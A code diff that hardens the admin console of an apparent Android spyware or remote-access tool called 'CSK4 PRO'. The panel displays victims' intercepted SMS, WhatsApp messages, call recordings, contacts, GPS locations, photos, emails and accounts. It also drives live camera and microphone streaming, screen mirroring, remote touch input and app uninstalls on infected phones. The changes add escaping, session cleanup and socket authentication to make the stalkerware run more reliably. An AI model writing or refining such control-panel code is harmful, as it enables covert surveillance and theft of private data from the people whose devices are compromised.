@@ -1,9 +1,26 @@
+// ============================================
+// CSK4 PRO v4.2 - Admin Panel Script (FIXED)
+// ============================================
+// FIXES:
+// - Single showDashboard call
+// - XSS protection everywhere
+// - setInterval cleanup on logout
+// - Race condition in loadData
+// - Toast max stack
+// - parseInt radix
+// - Better error handling
+// - Socket auth
+// ============================================
+
 const SERVER_URL = window.location.origin;
 let currentTab = 'devices';
 let allData = {};
 let socket;
 let autoRefreshTimer = null;
+let isFetching = false;
+const activeToasts = new Set();
 
+// ============ AUTH HEADERS ============
 function authHeaders(extra) {
   const h = Object.assign({ 'Content-Type': 'application/json' }, extra || {});
   const t = localStorage.getItem('csk4_token');
@@ -33,23 +50,59 @@ function login() {
       document.getElementById('loginError').textContent = '❌ Galat credentials';
     }
   })
-  .catch(() => document.getElementById('loginError').textContent = '❌ Server error');
+  .catch(() => {
+    document.getElementById('loginError').textContent = '❌ Server error';
+  });
 }
 
 function logout() {
+  // ✅ Clear timer
+  if (autoRefreshTimer) {
+    clearInterval(autoRefreshTimer);
+    autoRefreshTimer = null;
+  }
+  // ✅ Disconnect socket
+  if (socket) {
+    try { socket.disconnect(); } catch (e) {}
+    socket = null;
+  }
   localStorage.removeItem('csk4_token');
   location.reload();
 }
 
+// ============ DASHBOARD ============
 function showDashboard() {
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('dashboard').classList.remove('hidden');
+  
   loadData();
+  
+  // ✅ Clear old timer first
+  if (autoRefreshTimer) clearInterval(autoRefreshTimer);
   autoRefreshTimer = setInterval(loadData, 30000);
 
-  socket = io();
+  // ✅ Socket with auth
+  if (socket) {
+    try { socket.disconnect(); } catch (e) {}
+  }
+  
+  const token = localStorage.getItem('csk4_token');
+  socket = io({
+    auth: {
+      type: 'admin',
+      token: token
+    }
+  });
   window.socket = socket;
-  socket.emit('register-admin');
+  
+  socket.on('connect', () => {
+    console.log('✅ Socket connected');
+  });
+  
+  socket.on('connect_error', (err) => {
+    console.error('❌ Socket error:', err.message);
+  });
+  
   [
     'device-update','new-location','new-file','contacts-update','nearby-update',
     'messages-update','calllogs-update','apps-update','info-update',
@@ -60,12 +113,23 @@ function showDashboard() {
 
 // ============ LOAD DATA ============
 function loadData() {
+  if (isFetching) return;
+  isFetching = true;
+
   const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
   const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
 
   fetch(SERVER_URL + '/api/admin/data', { headers: authHeaders() })
-    .then(r => r.json())
+    .then(r => {
+      if (r.status === 401) {
+        localStorage.removeItem('csk4_token');
+        location.reload();
+        return null;
+      }
+      return r.json();
+    })
     .then(data => {
+      if (!data) return;
       allData = data;
       renderStats(data.stats || {});
       renderTab(currentTab);
@@ -76,13 +140,18 @@ function loadData() {
         if (cmdSel && savedCmd) cmdSel.value = savedCmd;
       }, 50);
     })
-    .catch(err => console.error(err));
+    .catch(err => console.error(err))
+    .finally(() => { isFetching = false; });
 }
 
 function refreshStatsOnly() {
   fetch(SERVER_URL + '/api/admin/data', { headers: authHeaders() })
-    .then(r => r.json())
+    .then(r => {
+      if (r.status === 401) return null;
+      return r.json();
+    })
     .then(data => {
+      if (!data) return;
       allData = data;
       renderStats(data.stats || {});
       if (['notifications','whatsapp','activities','siminfo','accounts','emails'].includes(currentTab)) {
@@ -113,7 +182,7 @@ function renderStats(s) {
 function showTab(tab, event) {
   currentTab = tab;
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  if (event) event.target.classList.add('active');
+  if (event && event.target) event.target.classList.add('active');
   renderTab(tab);
 }
 
@@ -127,10 +196,8 @@ function renderTab(tab) {
     videos: renderVideos, screenshots: renderScreenshots, audio: renderAudio,
     files: renderFiles, apps: renderApps, bluetooth: renderBluetooth,
     activities: renderActivities, send: renderSend, info: renderInfo,
-    commands: renderCommands,
-    siminfo: renderSimInfo,
-    accounts: renderAccounts,
-    emails: renderEmails
+    commands: renderCommands, siminfo: renderSimInfo,
+    accounts: renderAccounts, emails: renderEmails
   };
   el.innerHTML = (r[tab] || (() => '<div class="loading">Soon</div>'))();
 }
@@ -146,7 +213,7 @@ function renderDevices() {
     <div class="command-bar">
       <select id="cmdDevice" onchange="localStorage.setItem('csk4_dev', this.value)">
         <option value="">-- Device --</option>
-        ${list.map(d => `<option value="${d.deviceId}" ${d.deviceId===savedDevice?'selected':''}>${d.deviceName}</option>`).join('')}
+        ${list.map(d => `<option value="${esc(d.deviceId)}" ${d.deviceId===savedDevice?'selected':''}>${esc(d.deviceName)}</option>`).join('')}
       </select>
       <select id="cmdType" onchange="localStorage.setItem('csk4_cmd', this.value)">
         <optgroup label="📸 Capture">
@@ -211,15 +278,15 @@ function renderDevices() {
     html += `
       <div class="device-card">
         <div>
-          <div class="device-name">📱 ${d.deviceName}</div>
-          <div class="device-id">🆔 ${d.deviceId}</div>
+          <div class="device-name">📱 ${esc(d.deviceName)}</div>
+          <div class="device-id">🆔 ${esc(d.deviceId)}</div>
           <div class="device-id">🔋 ${d.battery||0}% | ⏰ ${new Date(d.lastSeen).toLocaleString()}</div>
         </div>
         <div>
           <span class="badge ${online}">${online}</span>
-          <button class="btn-action" onclick="quickLive('${d.deviceId}')" style="background:#dc2626">🔴 Live</button>
-          <button class="btn-action" onclick="quickScreen('${d.deviceId}')" style="background:#0891b2">🖥️ Screen</button>
-          <button class="btn-action btn-danger" onclick="deleteDevice('${d.deviceId}')">🗑️</button>
+          <button class="btn-action" onclick="quickLive('${esc(d.deviceId)}')" style="background:#dc2626">🔴 Live</button>
+          <button class="btn-action" onclick="quickScreen('${esc(d.deviceId)}')" style="background:#0891b2">🖥️ Screen</button>
+          <button class="btn-action btn-danger" onclick="deleteDevice('${esc(d.deviceId)}')">🗑️</button>
         </div>
       </div>
     `;
@@ -238,7 +305,7 @@ function quickLive(deviceId) {
     const sel = document.getElementById('liveDevice');
     if (sel) sel.value = deviceId;
     startLiveStream(deviceId, 'camera');
-  }, 200);
+  }, 300);
 }
 
 function quickScreen(deviceId) {
@@ -252,7 +319,7 @@ function quickScreen(deviceId) {
     const sel = document.getElementById('screenDevice');
     if (sel) sel.value = deviceId;
     startScreenMirror(deviceId);
-  }, 200);
+  }, 300);
 }
 
 function renderLive() {
@@ -262,7 +329,7 @@ function renderLive() {
       <div class="live-header">
         <select id="liveDevice">
           <option value="">-- Device Select --</option>
-          ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
+          ${list.map(d => `<option value="${esc(d.deviceId)}">${esc(d.deviceName)}</option>`).join('')}
         </select>
         <button onclick="startLiveStream(document.getElementById('liveDevice').value, 'camera')" style="background:#dc2626">🔴 Camera Live</button>
         <button onclick="startLiveStream(document.getElementById('liveDevice').value, 'audio')" style="background:#7c3aed">🎤 Audio Live</button>
@@ -285,7 +352,7 @@ function renderScreen() {
       <div class="live-header">
         <select id="screenDevice">
           <option value="">-- Device Select --</option>
-          ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
+          ${list.map(d => `<option value="${esc(d.deviceId)}">${esc(d.deviceName)}</option>`).join('')}
         </select>
         <button onclick="startScreenMirror(document.getElementById('screenDevice').value)" style="background:#0891b2">🖥️ Start Mirror</button>
         <button onclick="stopScreenMirror()" style="background:#374151">⏹️ Stop</button>
@@ -309,7 +376,7 @@ function renderScreen() {
 
 // ============ NOTIFICATIONS ============
 function renderNotifications() {
-  const list = (allData.notifications || []).slice().reverse().slice(0, 200);
+  const list = (allData.notifications || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi notification nahi</div>';
   return list.map(n => {
     let cls = '';
@@ -331,7 +398,7 @@ function renderNotifications() {
 }
 
 function renderWhatsapp() {
-  const list = (allData.whatsapp || []).slice().reverse().slice(0, 200);
+  const list = (allData.whatsapp || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi WhatsApp message nahi</div>';
   return list.map(w => `
     <div class="notification-item whatsapp">
@@ -344,7 +411,7 @@ function renderWhatsapp() {
 }
 
 function renderMessages() {
-  const list = (allData.messages || []).slice().reverse();
+  const list = allData.messages || [];
   if (!list.length) return '<div class="loading">Koi SMS nahi</div>';
   return list.map(m => {
     const typeColor = m.type === 'sent' ? '#4ade80' : '#4f8cff';
@@ -356,7 +423,7 @@ function renderMessages() {
         ${m.read === false ? '<span class="badge unread">UNREAD</span>' : ''}
       </div>
       <div style="color:#8b9ab5;margin:6px 0">${esc(m.body)}</div>
-      <div class="device-id">${new Date(parseInt(m.time)||m.time).toLocaleString()}</div>
+      <div class="device-id">${new Date(parseInt(m.time, 10)||m.time).toLocaleString()}</div>
     </div>
   `}).join('');
 }
@@ -370,32 +437,32 @@ function renderCallLogs() {
       <div>
         <div class="device-name">${types[c.type]||'📞'} ${esc(c.name || 'Unknown')}</div>
         <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(c.number)}</div>
-        <div class="device-id">⏱️ ${c.duration}s | ${new Date(parseInt(c.time)).toLocaleString()}</div>
+        <div class="device-id">⏱️ ${c.duration}s | ${new Date(parseInt(c.time, 10)).toLocaleString()}</div>
       </div>
-      <a href="tel:${c.number}" class="btn-action">📞</a>
+      <a href="tel:${esc(c.number)}" class="btn-action">📞</a>
     </div>
   `).join('');
 }
 
 function renderCallRecordings() {
-  const list = (allData.callRecordings || []).slice().reverse();
+  const list = allData.callRecordings || [];
   if (!list.length) return '<div class="loading">Koi call recording nahi</div>';
   return list.map(r => `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
       <div class="device-name">🎙️ ${esc(r.number)}</div>
-      <div class="device-id">${r.type || ''} | ⏱️ ${r.duration}s | ${new Date(r.time).toLocaleString()}</div>
-      <audio controls style="width:100%;margin-top:8px"><source src="${r.url}"></audio>
+      <div class="device-id">${esc(r.type || '')} | ⏱️ ${r.duration}s | ${new Date(r.time).toLocaleString()}</div>
+      <audio controls style="width:100%;margin-top:8px"><source src="${esc(r.url)}"></audio>
     </div>
   `).join('');
 }
 
 function renderLocations() {
-  const list = (allData.locations || []).slice().reverse().slice(0, 200);
+  const list = (allData.locations || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi location nahi</div>';
   return list.map(l => `
     <div class="item-card">
       <div>
-        <div class="device-id">${l.deviceId}</div>
+        <div class="device-id">${esc(l.deviceId)}</div>
         <div style="color:#4f8cff;font-weight:600;margin:4px 0">📍 ${l.lat.toFixed(6)}, ${l.lng.toFixed(6)}</div>
         <div class="device-id">🎯 ${l.accuracy?Math.round(l.accuracy)+'m':'N/A'} | ⏰ ${new Date(l.time).toLocaleString()}</div>
       </div>
@@ -412,17 +479,16 @@ function renderContacts() {
       <div>
         <div class="device-name">👤 ${esc(c.name || 'Unknown')}</div>
         <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(c.phone || 'No number')}</div>
-        ${c.type ? `<div class="device-id">📱 ${c.type}</div>` : ''}
+        ${c.type ? `<div class="device-id">📱 ${esc(c.type)}</div>` : ''}
       </div>
       <div>
-        <a href="tel:${c.phone}" class="btn-action">📞</a>
-        <a href="sms:${c.phone}" class="btn-action">💬</a>
+        <a href="tel:${esc(c.phone)}" class="btn-action">📞</a>
+        <a href="sms:${esc(c.phone)}" class="btn-action">💬</a>
       </div>
     </div>
   `).join('');
 }
 
-// ============ 🆕 SIM INFO ============
 function renderSimInfo() {
   const simData = allData.simInfo || {};
   const deviceIds = Object.keys(simData);
@@ -435,7 +501,7 @@ function renderSimInfo() {
     data.sims.forEach(sim => {
       html += `
         <div class="device-card" style="flex-direction:column;align-items:flex-start">
-          <div class="device-name">📶 SIM ${sim.slot}</div>
+          <div class="device-name">📶 SIM ${esc(sim.slot)}</div>
           <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(sim.number || 'N/A')}</div>
           <div class="device-id">📡 Operator: ${esc(sim.operator || 'N/A')}</div>
           <div class="device-id">🌍 Country: ${esc(sim.country || 'N/A')}</div>
@@ -449,7 +515,6 @@ function renderSimInfo() {
   return html;
 }
 
-// ============ 🆕 ACCOUNTS ============
 function renderAccounts() {
   const accData = allData.accounts || {};
   const deviceIds = Object.keys(accData);
@@ -460,13 +525,14 @@ function renderAccounts() {
     if (!data.accounts || !data.accounts.length) return;
     html += `<h3 style="color:#4f8cff;margin:16px 0 12px">👤 ${esc(deviceId)} (${data.total})</h3>`;
     data.accounts.forEach(acc => {
+      const t = acc.type || '';
       let icon = '📧';
-      if (acc.type.includes('whatsapp')) icon = '💬';
-      else if (acc.type.includes('facebook')) icon = '👥';
-      else if (acc.type.includes('instagram')) icon = '📸';
-      else if (acc.type.includes('twitter')) icon = '🐦';
-      else if (acc.type.includes('linkedin')) icon = '💼';
-      else if (acc.type.includes('google')) icon = '🔍';
+      if (t.includes('whatsapp')) icon = '💬';
+      else if (t.includes('facebook')) icon = '👥';
+      else if (t.includes('instagram')) icon = '📸';
+      else if (t.includes('twitter')) icon = '🐦';
+      else if (t.includes('linkedin')) icon = '💼';
+      else if (t.includes('google')) icon = '🔍';
       html += `
         <div class="item-card">
           <div>
@@ -480,7 +546,6 @@ function renderAccounts() {
   return html;
 }
 
-// ============ 🆕 EMAILS ============
 function renderEmails() {
   const emailData = allData.emails || {};
   const deviceIds = Object.keys(emailData);
@@ -505,55 +570,55 @@ function renderEmails() {
 }
 
 function renderPhotos() {
-  const list = (allData.photos || []).slice().reverse();
+  const list = allData.photos || [];
   if (!list.length) return '<div class="loading">Koi photo nahi</div>';
   return '<div class="photos-grid">' + list.map(p => `
-    <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
+    <a href="${esc(p.url)}" target="_blank"><img src="${esc(p.url)}"></a>
   `).join('') + '</div>';
 }
 
 function renderVideos() {
-  const list = (allData.videos || []).slice().reverse();
+  const list = allData.videos || [];
   if (!list.length) return '<div class="loading">Koi video nahi</div>';
   return list.map(v => `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
-      <div class="device-name">🎥 ${v.originalName}</div>
+      <div class="device-name">🎥 ${esc(v.originalName)}</div>
       <div class="device-id">${(v.size/1024/1024).toFixed(2)} MB</div>
-      <video controls style="width:100%;max-width:400px;margin-top:8px"><source src="${v.url}"></video>
+      <video controls style="width:100%;max-width:400px;margin-top:8px"><source src="${esc(v.url)}"></video>
     </div>
   `).join('');
 }
 
 function renderScreenshots() {
-  const list = (allData.screenshots || []).slice().reverse();
+  const list = allData.screenshots || [];
   if (!list.length) return '<div class="loading">Koi screenshot nahi</div>';
   return '<div class="photos-grid">' + list.map(p => `
-    <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
+    <a href="${esc(p.url)}" target="_blank"><img src="${esc(p.url)}"></a>
   `).join('') + '</div>';
 }
 
 function renderAudio() {
-  const list = (allData.audio || []).slice().reverse();
+  const list = allData.audio || [];
   if (!list.length) return '<div class="loading">Koi audio nahi</div>';
   return list.map(a => `
     <div class="item-card" style="flex-direction:column;align-items:flex-start">
-      <div class="device-name">🎤 ${a.originalName}</div>
+      <div class="device-name">🎤 ${esc(a.originalName)}</div>
       <div class="device-id">${new Date(a.time).toLocaleString()}</div>
-      <audio controls style="width:100%;margin-top:8px"><source src="${a.url}"></audio>
+      <audio controls style="width:100%;margin-top:8px"><source src="${esc(a.url)}"></audio>
     </div>
   `).join('');
 }
 
 function renderFiles() {
-  const list = (allData.files || []).slice().reverse();
+  const list = allData.files || [];
   if (!list.length) return '<div class="loading">Koi file nahi</div>';
   return list.map(f => `
     <div class="item-card">
       <div>
-        <div class="device-name">📄 ${f.originalName}</div>
+        <div class="device-name">📄 ${esc(f.originalName)}</div>
         <div class="device-id">${(f.size/1024).toFixed(1)} KB | ${new Date(f.time).toLocaleString()}</div>
       </div>
-      <a href="${f.url}" target="_blank" class="btn-action">⬇️</a>
+      <a href="${esc(f.url)}" target="_blank" class="btn-action">⬇️</a>
     </div>
   `).join('');
 }
@@ -565,10 +630,10 @@ function renderApps() {
     <div class="item-card">
       <div>
         <div class="device-name">📲 ${esc(a.name)}</div>
-        <div class="device-id">${a.package}</div>
+        <div class="device-id">${esc(a.package)}</div>
       </div>
-      <button class="btn-action" onclick="openApp('${a.package}')">▶️ Open</button>
-      <button class="btn-action btn-danger" onclick="uninstallApp('${a.package}')">🗑️ Uninstall</button>
+      <button class="btn-action" onclick="openApp('${esc(a.package)}')">▶️ Open</button>
+      <button class="btn-action btn-danger" onclick="uninstallApp('${esc(a.package)}')">🗑️ Uninstall</button>
     </div>
   `).join('');
 }
@@ -580,14 +645,14 @@ function renderBluetooth() {
     <div class="item-card">
       <div>
         <div class="device-name">📶 ${esc(d.name||'Unknown')}</div>
-        <div class="device-id">${d.address} | ${d.type||''} | RSSI: ${d.rssi||'N/A'}</div>
+        <div class="device-id">${esc(d.address)} | ${esc(d.type||'')} | RSSI: ${d.rssi||'N/A'}</div>
       </div>
     </div>
   `).join('');
 }
 
 function renderActivities() {
-  const list = (allData.activities || []).slice().reverse().slice(0, 300);
+  const list = (allData.activities || []).slice(0, 300);
   if (!list.length) return '<div class="loading">Koi activity nahi</div>';
   return list.map(a => {
     let icon = '📊';
@@ -620,7 +685,7 @@ function renderSend() {
       <h3>📤 Send Message to Device</h3>
       <select id="sendDevice">
         <option value="">-- Device Select --</option>
-        ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
+        ${list.map(d => `<option value="${esc(d.deviceId)}">${esc(d.deviceName)}</option>`).join('')}
       </select>
       <select id="sendType">
         <option value="show_notification">🔔 Notification</option>
@@ -643,28 +708,28 @@ function renderInfo() {
     const i = info[k];
     return `
       <div class="device-card"><div style="width:100%">
-        <div class="device-name">📱 ${i.model||k}</div>
-        <div class="device-id">Brand: ${i.brand} | Android: ${i.android} (SDK ${i.sdk})</div>
-        <div class="device-id">CPU: ${i.cpu}</div>
-        <div class="device-id">RAM: ${i.availableRAM}/${i.totalRAM} MB</div>
-        <div class="device-id">Storage: ${i.availableStorage}/${i.totalStorage} MB</div>
+        <div class="device-name">📱 ${esc(i.model||k)}</div>
+        <div class="device-id">Brand: ${esc(i.brand)} | Android: ${esc(i.android)} (SDK ${esc(i.sdk)})</div>
+        <div class="device-id">CPU: ${esc(i.cpu)}</div>
+        <div class="device-id">RAM: ${esc(i.availableRAM)}/${esc(i.totalRAM)} MB</div>
+        <div class="device-id">Storage: ${esc(i.availableStorage)}/${esc(i.totalStorage)} MB</div>
       </div></div>
     `;
   }).join('');
 }
 
 function renderCommands() {
-  const list = (allData.commands || []).slice().reverse().slice(0, 200);
+  const list = (allData.commands || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi command nahi</div>';
   return list.map(c => `
     <div class="item-card">
       <div>
-        <div class="device-name">🎮 ${c.command}</div>
-        <div class="device-id">${c.deviceId}</div>
+        <div class="device-name">🎮 ${esc(c.command)}</div>
+        <div class="device-id">${esc(c.deviceId)}</div>
         <div class="device-id">${new Date(c.time).toLocaleString()}</div>
-        ${c.result ? `<div class="device-id">↳ ${c.result}</div>` : ''}
+        ${c.result ? `<div class="device-id">↳ ${esc(c.result)}</div>` : ''}
       </div>
-      <span class="badge ${c.status==='done'?'online':'offline'}">${c.status}</span>
+      <span class="badge ${c.status==='done'?'online':'offline'}">${esc(c.status)}</span>
     </div>
   `).join('');
 }
@@ -681,7 +746,7 @@ function sendCommand() {
   if (['set_brightness', 'set_volume'].includes(command)) {
     const val = prompt('Value (0-100):', '50');
     if (!val) return;
-    params.value = parseInt(val);
+    params.value = parseInt(val, 10);
   } else if (command === 'set_ring_mode') {
     const val = prompt('Mode (silent/vibrate/normal):', 'silent');
     if (!val) return;
@@ -725,7 +790,7 @@ function sendCustomMessage() {
 }
 
 function sendTouch(action, x, y) {
-  const deviceId = document.getElementById('screenDevice').value;
+  const deviceId = document.getElementById('screenDevice')?.value;
   if (!deviceId) return alert('Device select karein');
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
@@ -766,6 +831,7 @@ function clearCommands() {
   fetch(SERVER_URL + '/api/admin/clear-commands/' + id, { method: 'DELETE', headers: authHeaders() }).then(() => loadData());
 }
 
+// ============ ESCAPE HTML ============
 function esc(s) {
   if (s === null || s === undefined) return '';
   const d = document.createElement('div');
@@ -773,29 +839,43 @@ function esc(s) {
   return d.innerHTML;
 }
 
+// ============ TOAST (max stack) ============
 function toast(m) {
   const t = document.createElement('div');
   t.style.cssText = 'position:fixed;top:20px;right:20px;background:#4f8cff;color:#fff;padding:12px 20px;border-radius:8px;z-index:9999;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px';
   t.textContent = m;
   document.body.appendChild(t);
-  setTimeout(() => t.remove(), 3000);
+  activeToasts.add(t);
+  
+  // ✅ Max 5 toasts
+  if (activeToasts.size > 5) {
+    const first = activeToasts.values().next().value;
+    first.remove();
+    activeToasts.delete(first);
+  }
+  
+  setTimeout(() => {
+    t.remove();
+    activeToasts.delete(t);
+  }, 3000);
 }
 
+// ============ INIT (single call) ============
 document.addEventListener('DOMContentLoaded', () => {
-  if (localStorage.getItem('csk4_token')) showDashboard();
+  if (localStorage.getItem('csk4_token')) {
+    showDashboard();
+  } else {
+    fetch(SERVER_URL + '/api/admin/status')
+      .then(r => r.json())
+      .then(s => {
+        const m = document.getElementById('loginMongoStatus');
+        const t = document.getElementById('loginTgStatus');
+        if (m) m.textContent = s.mongo ? '💾 MongoDB: Connected' : '💾 MongoDB: Not connected';
+        if (t) t.textContent = s.telegram ? '📱 Telegram: Active' : '📱 Telegram: Not configured';
+      })
+      .catch(() => {});
+  }
+  
   const pass = document.getElementById('password');
   if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') login(); });
 });
-
-
-// Restore session after refresh
-if (localStorage.getItem('csk4_token')) {
-  showDashboard();
-} else {
-  fetch(SERVER_URL + '/api/admin/status').then(r => r.json()).then(s => {
-    const m = document.getElementById('loginMongoStatus');
-    const t = document.getElementById('loginTgStatus');
-    if (m) m.textContent = s.mongo ? '💾 MongoDB: Connected' : '💾 MongoDB: Not connected';
-    if (t) t.textContent = s.telegram ? '📱 Telegram: Active' : '📱 Telegram: Not configured';
-  }).catch(() => {});
-}
